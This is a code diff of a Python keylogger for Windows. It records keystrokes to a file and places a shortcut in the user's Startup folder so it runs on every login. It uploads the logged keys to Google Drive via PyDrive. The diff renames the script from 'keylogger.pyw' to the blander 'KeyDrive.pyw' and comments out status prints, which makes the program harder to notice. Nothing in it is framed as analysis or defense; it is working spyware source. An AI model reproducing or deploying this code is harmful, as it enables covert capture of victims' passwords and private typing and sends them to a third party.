@@ -10,9 +10,10 @@ import threading
 import socket
 from pydrive.drive import GoogleDrive #  install PyDrive by pip install PyDrive
 
+
 #first make an folder in temp
-save = tempfile.mkdtemp("capture")
-print(save) #just printing the path to find out the actual path of temp
+save = tempfile.mkdtemp("screen")
+#print(save) #just printing the path to find out the actual path of temp
 cwd = os.getcwd() #it returns current working directory
 source = os.listdir() #gives list of files in current directory
 
@@ -33,13 +34,13 @@ destination = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Program
 
 #now write the main method for creating shortcut file in startup folder
 def main():
-    path = os.path.join(destination, "keylogger.pyw - Shortcut.lnk")#here set the path along it's name 7 extension
+    path = os.path.join(destination, "KeyDrive.pyw - Shortcut.lnk")#here set the path along it's name 7 extension
     #now we have to set the link file source
-    target = r""+cwd+"\keylogger.pyw"
+    target = r""+cwd+"\KeyDrive.pyw"
     #now set the current file icon for it
-    icon = r""+cwd+"\keylogger.pyw"
+    icon = r""+cwd+"\KeyDrive.pyw"
     for files in source:
-        if files == "keylogger.pyw":
+        if files == "KeyDrive.pyw":
             #here we have to pass all objects we are created for sent icon,path & target etc
             shell = Dispatch('WScript.Shell')
             shortcut = shell.CreateShortCut(path)
@@ -50,7 +51,7 @@ def main():
 
 #it's done let's call it by writing funcation name
 #we also look for it currently exit in startup folder or not
-shortcut = 'keylogger.pyw - Shortcut.lnk'
+shortcut = 'KeyDrive.pyw - Shortcut.lnk'
 if shortcut in destination:
     pass
 else:
@@ -66,16 +67,6 @@ def is_connected():
         pass
     return False
 
-# now write a function to uuplad file on drive.
-def uploadOnDrive():
-    #create an instance
-    drive = GoogleDrive()
-    file5 = drive.CreateFile()
-    # Read file and set it as a content of this instance.
-    file5.SetContentFile(filename)
-    file5.Upload() # Upload the file
-    print("Upload Successfully......")
-    
 
 #now write the write_file method which
 def write_file(keys):
@@ -89,6 +80,17 @@ def write_file(keys):
                 pass
             else:#else for remaning words we write into the file.
                 f.write(key.replace("'",""))
+
+# now write a function to uuplad file on drive.
+def uploadOnDrive():
+    #create an instance
+    drive = GoogleDrive()
+    upfile = drive.CreateFile()
+    # Read file and set it as a content of this instance.
+    upfile.SetContentFile(filename)
+    upfile.Upload() # Upload the file
+    print("Upload Successfully......")
+    # now we need to call 
 
 
 # now write an function which takes key as a parameter
@@ -113,7 +115,7 @@ def on_press(key):
             # else condition exec when internet connection is not working
             countInternet += 1
             # printing the status for monitor
-            print('not connected',countInternet)
+            #print('not connected',countInternet)
             # once internet connection is not working then it will not send file to email
             # now we have to copy file from temp folder to current directory so it is easily accessible instead of looking in temp folder manually
             if countInternet > 10:
